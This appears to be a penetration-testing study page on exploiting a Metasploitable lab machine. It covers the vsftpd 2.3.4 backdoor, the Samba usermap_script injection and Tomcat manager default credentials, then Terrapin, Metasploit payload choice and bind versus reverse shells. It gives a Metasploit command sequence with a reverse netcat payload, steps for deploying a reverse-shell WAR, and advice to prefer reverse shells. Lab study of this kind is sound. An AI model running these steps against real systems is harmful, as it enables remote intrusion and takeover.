CVE Research & Risk Analysis

01
CVE-2011-2523
vsftpd 2.3.4 Backdoor — FTP Port 21
10.0

A backdoor was introduced into vsftpd version 2.3.4 via a malicious actor who tampered with the official source tarball. When a username containing a smiley face ":)" is submitted, the daemon spawns a root shell on TCP port 6200.

HYPOTHETICAL ATTACK SCENARIO
  • 1Attacker connects to port 21 and sends username "user:)" with any password.
  • 2vsftpd 2.3.4 opens a command shell on port 6200.
  • 3Attacker connects to port 6200 and receives a root shell.
  • 4Full system compromise achieved without any credential or brute-force.
nmap -p 6200 192.168.56.101 --script ftp-vsftpd-backdoor
02
CVE-2007-2447
Samba 3.0.20 Username Map Script — Ports 445/139
9.3

A command injection vulnerability in Samba's MS-RPC functionality. User-supplied input is passed directly to the shell without sanitization, allowing remote unauthenticated code execution as root.

METASPLOIT MODULE
use exploit/multi/samba/usermap_script set RHOSTS 192.168.56.101 set PAYLOAD cmd/unix/reverse_netcat exploit
03
CVE-2009-3548
Apache Tomcat Weak Credentials / Manager RCE — Port 8180
7.5

Apache Tomcat deployed on Metasploitable uses default credentials (tomcat/tomcat) for the /manager/html interface. An attacker can upload a malicious WAR file containing a JSP webshell, achieving RCE.

  • 1Navigate to http://192.168.56.101:8180/manager/html
  • 2Default credentials tomcat:tomcat are accepted.
  • 3Craft a WAR file using msfvenom containing a reverse shell payload.
  • 4Upload & deploy via the manager interface — trigger to get shell access.

Pending Research Topics

6.1
THE TERRAPIN ATTACK (CVE-2023-48795)

A prefix truncation attack targeting the SSH Binary Packet Protocol (SSH-BPP), discovered in December 2023 by researchers at Ruhr University Bochum. Targets the handshake phase directly — no authentication required.

# Technical mechanism flow: Client ──[KEXINIT]──> MitM ──[KEXINIT + injected]──> Server MitM deletes ext-info-s and ping@openssh.com markers Server accepts degraded capabilities without detecting tampering
MITIGATION

Update OpenSSH to version 9.6+ (implements "strict KEX" countermeasure). Disable vulnerable cipher suites (chacha20-poly1305, CTR/CBC with encrypt-then-MAC). Use network segmentation to reduce MitM exposure.

AUTO PAYLOAD RECOMMENDATION IN METASPLOIT

Metasploit recommends payloads automatically based on platform compatibility, architecture, payload space, BadChars, and reliability ranking — all defined in each module's Ruby metadata block.

# Example from exploit/multi/samba/usermap_script 'DefaultOptions' => { 'EXITFUNC' => 'thread' }, 'Platform' => 'unix', 'Arch' => ARCH_CMD, 'Payload' => { 'Space' => 1024, 'BadChars' => '' }
STAGED PAYLOAD
Small initial stager sent to target
Downloads full payload from handler
Requires network connectivity back
Auto-recommended for tight payload space
STAGELESS PAYLOAD
Entire payload embedded in exploit
Self-contained — no download needed
More reliable on unstable connections
Auto-recommended when payload space is large

6.3
BIND SHELL vs. REVERSE SHELL

Two paradigms for establishing shell sessions after exploitation. Choice depends entirely on network topology, firewall posture, and visibility requirements.

USE BIND SHELL WHEN…
Attacker IP is dynamic or behind NAT
Target has a static, reachable IP/port
Outbound traffic from target is blocked
Internal lab / same-subnet scenario
USE REVERSE SHELL WHEN…
Target is behind NAT/firewall (common case)
Target allows outbound HTTP/HTTPS traffic
Real-world pentest engagements
Metasploit meterpreter sessions
# MSF naming convention windows/meterpreter/reverse_tcp → Target connects OUT to attacker windows/meterpreter/bind_tcp → Attacker connects IN to target cmd/unix/reverse_netcat → Reverse shell using netcat cmd/unix/bind_netcat → Bind shell using netcat
★ RULE OF THUMB: Default to Reverse Shell in all real engagements. Use Bind Shell only when the target has an exposed port and your machine cannot receive inbound connections.
